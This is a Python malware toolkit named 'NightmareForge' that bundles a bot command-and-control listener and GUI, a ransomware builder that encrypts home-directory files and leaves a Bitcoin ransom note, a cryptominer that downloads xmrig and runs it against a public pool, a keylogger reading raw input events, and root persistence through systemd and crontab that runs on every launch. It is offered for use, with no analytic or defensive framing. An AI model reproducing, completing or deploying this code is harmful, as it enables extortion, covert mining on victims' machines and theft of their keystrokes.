#!/usr/bin/env python3
"""
NightmareForge v2.3 – ULTRA-CONCISE + KEYLOGGER + GUI FIXED
@nathan_non12796 | MU | 2025-11-17 01:15 +04
"""

import os, sys, time, random, socket, threading, hashlib, subprocess, argparse
from datetime import datetime
from Crypto.Random import get_random_bytes

# === GUI ===
try:
    from PyQt6.QtWidgets import *
    from PyQt6.QtCore import QTimer, Qt
    GUI = True
except: GUI = False

# =================================== #
#          CORE
# =================================== #
log = lambda m: open("nf.log","a").write(f"[{datetime.now().strftime('%H:%M')}] {m}\n")
id = hashlib.sha256(os.urandom(8)).hexdigest()[:8]

# =================================== #
#          P2P C2
# =================================== #
class C2:
    PORT = 6666; PEERS = []; BOTS = 0
    @staticmethod
    def listen():
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try: s.bind(("0.0.0.0", C2.PORT)); s.listen(5)
        except: return
        while 1:
            try: c, a = s.accept(); C2.BOTS += 1
            except: continue
            if a[0] not in C2.PEERS: C2.PEERS.append(a[0])
            threading.Thread(target=lambda: c.close(), daemon=True).start()

    @staticmethod
    def send(cmd):
        for ip in C2.PEERS[:20]:
            try:
                s = socket.socket(); s.settimeout(1); s.connect((ip, C2.PORT))
                s.send(f"CMD|{cmd}".encode()); s.close()
            except: pass
        log(f"CMD: {cmd}")

# =================================== #
#          PAYLOADS
# =================================== #
def ransom():
    key, iv = get_random_bytes(32), get_random_bytes(16)
    src = f'''
#include <openssl/aes.h>
unsigned char k[32] = {{{','.join(map(str,key))}}};
unsigned char i[16] = {{{','.join(map(str,iv))}}};
void e(const char* f){{
    FILE *in=fopen(f,"rb"); if(!in) return;
    fseek(in,0,SEEK_END); long z=ftell(in); fseek(in,0,SEEK_SET);
    unsigned char *b=malloc(z), *o=malloc(z+16);
    fread(b,1,z,in); fclose(in);
    AES_KEY a; AES_set_encrypt_key(k,256,&a);
    AES_cbc_encrypt(b,o,z,&a,i,AES_ENCRYPT);
    char n[256]; snprintf(n,256,"%s.locked",f);
    FILE *out=fopen(n,"wb"); fwrite(o,1,z+16,out); fclose(out);
    remove(f); free(b); free(o);
}}
int main(){{
    system("find /home -type f \\( -name '*.txt' -o -name '*.docx' \\) -exec sh -c 'e \"$0\"' {{}} \\;");
    system("echo 'PAY 0.1 BTC' > /home/Desktop/RANSOM.txt");
    return 0;
}}'''
    open("r.c","w").write(src)
    subprocess.run(["gcc","r.c","-o","ransom","-lcrypto","-lssl"], stdout=subprocess.DEVNULL)
    log("RANSOM READY")

def miner():
    if not os.path.exists("xmrig"):
        subprocess.run(["wget","-q","https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz","-O","x.tgz"])
        subprocess.run(["tar","xf","x.tgz"], stdout=subprocess.DEVNULL)
        os.rename("xmrig-6.21.0/xmrig","xmrig"); os.chmod("xmrig",0o755)
    cfg = '{"pools":[{"url":"pool.supportxmr.com:3333","user":"","pass":"nf"}],"cpu":true}'
    open("c.json","w").write(cfg)
    subprocess.Popen(["./xmrig","-c","c.json"])
    log("MINER LIVE")

def keylogger():
    src = '''
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
int main() {
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) return 1;
    struct input_event ev;
    FILE *log = fopen("/tmp/.k", "a");
    while (1) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 1)
            fprintf(log, "%d ", ev.code);
    }
    return 0;
}'''
    open("kl.c","w").write(src)
    subprocess.run(["gcc","kl.c","-o","kl"], stdout=subprocess.DEVNULL)
    subprocess.Popen(["./kl"])
    log("KEYLOGGER ACTIVE")

# =================================== #
#          PERSISTENCE
# =================================== #
def persist():
    me = os.path.abspath(__file__)
    for f, c in [
        ("/etc/systemd/system/nf.service", f"[Unit]\nDescription=NF\n[Service]\nExecStart=/usr/bin/python3 {me}\nRestart=always\n[Install]\nWantedBy=multi-user.target"),
        ("/etc/crontab", f"@reboot root /usr/bin/python3 {me}\n")
    ]:
        try: open(f,"a").write(c); subprocess.run(["systemctl","enable","nf.service"] if "systemd" in f else [])
        except: pass
    log("PERSISTED")

# =================================== #
#          GUI C2
# =================================== #
class GUI_C2(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NF C2")
        self.setFixedSize(360, 260)
        self.setStyleSheet("background:#000;color:#0f0;font:8pt Consolas")

        l = QVBoxLayout()
        self.b = QLabel("BOTS: 0"); self.b.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.c = QLineEdit(); self.c.setPlaceholderText("cmd...")
        s = QPushButton("SEND"); s.clicked.connect(self.send)
        btns = QHBoxLayout()
        for t, f in [("RANSOM",ransom),("MINE",miner),("KEYLOG",keylogger),("PERSIST",persist)]:
            b = QPushButton(t); b.clicked.connect(f); btns.addWidget(b)

        l.addWidget(self.b); l.addWidget(self.c); l.addWidget(s); l.addLayout(btns)
        w = QWidget(); w.setLayout(l); self.setCentralWidget(w)

        threading.Thread(target=C2.listen, daemon=True).start()
        self.t = QTimer(); self.t.timeout.connect(self.u); self.t.start(1000)

    def send(self): C2.send(self.c.text()); self.c.clear()
    def u(self): self.b.setText(f"BOTS: {C2.BOTS}")

# =================================== #
#          MAIN
# =================================== #
def main():
    persist()
    p = argparse.ArgumentParser()
    p.add_argument("--gui", action="store_true")
    a = p.parse_args()

    if a.gui:
        if not GUI: print("PyQt6 missing! Run install.sh"); return
        app = QApplication(sys.argv)  # ← FIXED: Use sys.argv
        w = GUI_C2(); w.show(); app.exec()  # ← FIXED
    else:
        print(f"NF v2.3 | ID: {id}")

if __name__ == "__main__":
    main()
